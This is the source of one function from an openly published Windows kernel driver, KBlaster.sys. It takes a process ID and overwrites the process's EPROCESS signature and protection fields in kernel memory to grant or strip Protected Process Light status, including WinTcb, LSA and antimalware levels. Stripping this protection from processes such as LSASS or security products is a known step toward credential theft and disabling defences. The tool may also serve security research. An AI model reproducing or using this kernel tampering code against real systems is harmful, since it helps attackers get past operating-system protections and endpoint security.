/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlaster.sys ( driver )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlaster_k_protection.hpp"


__declspec(code_seg("PAGE"))
NTSTATUS Kblaster_ppl_SetProtection(
	_In_ PVOID pProtectionRequest, 
	_In_ ULONG RequestLength)
{
	NTSTATUS status = 1;
	PEPROCESS pEprocess = 0;
	PPROCESS_PROTECTION_INFO pProtInfo = 0;
	PKBLR_PROTECTION pRequest = static_cast<PKBLR_PROTECTION>(pProtectionRequest);

	if (RequestLength < sizeof(KBLR_PROTECTION) ||
		!pRequest->processId) {
		status = STATUS_INVALID_PARAMETER;
		goto Exit;
	}

	status = PsLookupProcessByProcessId(
		UlongToHandle(pRequest->processId), &pEprocess);
	if (!NT_SUCCESS(status)) {
		goto Exit;
	}
	
	pProtInfo = (PPROCESS_PROTECTION_INFO)Add2Ptr(
		pEprocess, EPROCESS_SIGNATURE_LEVEL_OFFSET[g_WindowsVersion]);
	
	ACQUIRE_WRITE_LOCK(g_Locked);
	switch (pRequest->Protection)
	{
	case ProtectionWintcb: // full (wintcb)
		pProtInfo->SignatureLevel = 30;
		pProtInfo->SectionSignatureLevel = 28;
		pProtInfo->Protection.Type = 2;
		pProtInfo->Protection.Signer = 6;
		break;

	case ProtectionLsa: // light (lsa)
		pProtInfo->SignatureLevel = 38;
		pProtInfo->SectionSignatureLevel = 8;
		pProtInfo->Protection.Type = 1;
		pProtInfo->Protection.Signer = 4;
		break;

	case ProtectionAntimalware: // light (antimalware)
		pProtInfo->SignatureLevel = 37;
		pProtInfo->SectionSignatureLevel = 7;
		pProtInfo->Protection.Type = 1;
		pProtInfo->Protection.Signer = 3;
		break;

	case ProtectionNone:
		pProtInfo->SignatureLevel = 0;
		pProtInfo->SectionSignatureLevel = 0;
		pProtInfo->Protection.Type = 0;
		pProtInfo->Protection.Signer = 0;
		break;

	default:
		break;
	}
	RELEASE_WRITE_LOCK(g_Locked);

Exit:
	if (pEprocess) {
		ObDereferenceObject(pEprocess);
	}

	pProtInfo = 0;

	return status;
}